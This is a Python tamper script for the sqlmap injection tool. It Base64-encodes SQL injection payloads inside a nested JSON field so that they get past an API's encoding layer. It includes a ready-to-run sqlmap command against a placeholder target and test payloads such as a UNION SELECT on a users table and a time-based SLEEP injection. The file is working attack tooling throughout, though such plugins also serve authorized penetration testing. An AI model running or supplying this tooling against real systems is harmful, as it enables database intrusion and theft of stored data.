#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Tamper script for Base64 encoded nested JSON parameters

Author: SQLMap Web UI Project
Date: 2026-03-27
Version: 1.0

Description:
    This tamper script is designed for scenarios where:
    - The request body contains a JSON with a 'content' field
    - The 'content' field is Base64 encoded
    - Inside the Base64 content is another JSON with injectable parameters
    
    The script:
    1. Takes the SQL injection payload from SQLMap
    2. Wraps it in the inner JSON structure
    3. Base64 encodes the result
    4. Returns the encoded content for the request

Usage:
    Place this file in one of the following locations:
    1. SQLMap installation directory: /path/to/sqlmap/tamper/
    2. Project directory: sqlmapWebUI/src/backEnd/tampers/
    3. Current working directory
    
    Then run SQLMap:
    python sqlmap.py -u "http://target.com/api" \\
        --data='{"req_id":"1","content":"test"}' \\
        --tamper=base64_nested \\
        -p content \\
        --batch

Configuration:
    Modify INNER_PARAM to match the actual parameter name in your API

Dependencies:
    - Standard library only (base64, json)
"""

import base64
import json

# SQLMap imports
try:
    from lib.core.enums import PRIORITY
    from lib.core.settings import UNICODE_ENCODING
except ImportError:
    # For local testing without SQLMap
    PRIORITY = None
    UNICODE_ENCODING = 'utf-8'

__priority__ = PRIORITY.NORMAL if PRIORITY else 1

# ============================================================================
# CONFIGURATION - Modify these for your specific use case
# ============================================================================

INNER_PARAM = "name"  # The parameter inside the nested JSON to inject
INNER_DATA_TEMPLATE = {"age": 18}  # Additional static fields

# ============================================================================


def dependencies():
    """
    SQLMap dependency check function
    """
    pass


def tamper(payload, **kwargs):
    """
    Main tamper function called by SQLMap
    
    Args:
        payload: The SQL injection payload from SQLMap
                 Examples:
                 - "test' AND 1=1--"
                 - "test') AND 1=1--"
                 - "test AND 1=1"
        **kwargs: Additional arguments (headers, hints, etc.)
    
    Returns:
        Base64 encoded JSON string with injected payload
    """
    if not payload:
        return payload
    
    try:
        # SQLMap sends the payload with the original value prefix
        # We need to keep the "test" base value and add the injection
        # The payload format is: "test<injection>"
        
        # Build the inner JSON structure
        inner_data = INNER_DATA_TEMPLATE.copy()
        inner_data[INNER_PARAM] = payload
        
        # Convert to JSON string
        inner_json = json.dumps(inner_data, ensure_ascii=False)
        
        # Base64 encode
        encoded = base64.b64encode(
            inner_json.encode(UNICODE_ENCODING)
        ).decode(UNICODE_ENCODING)
        
        return encoded
        
    except Exception as e:
        # If anything goes wrong, log error and return original payload
        # This prevents SQLMap from crashing
        try:
            import sys
            sys.stderr.write(f"[base64_nested tamper error] {str(e)}\n")
        except:
            pass
        return payload


# ============================================================================
# Testing code (only runs when script is executed directly)
# ============================================================================

if __name__ == "__main__":
    # Test cases
    test_payloads = [
        "test",
        "test' AND 1=1--",
        "test' UNION SELECT * FROM users--",
        "test') AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ]
    
    print("=" * 60)
    print("Tamper Script Test")
    print("=" * 60)
    
    for payload in test_payloads:
        result = tamper(payload)
        print(f"\nInput:  {payload}")
        print(f"Output: {result}")
        
        # Verify by decoding
        try:
            decoded = base64.b64decode(result).decode('utf-8')
            print(f"Verify: {decoded}")
        except Exception as e:
            print(f"Verify: ERROR - {e}")
    
    print("\n" + "=" * 60)
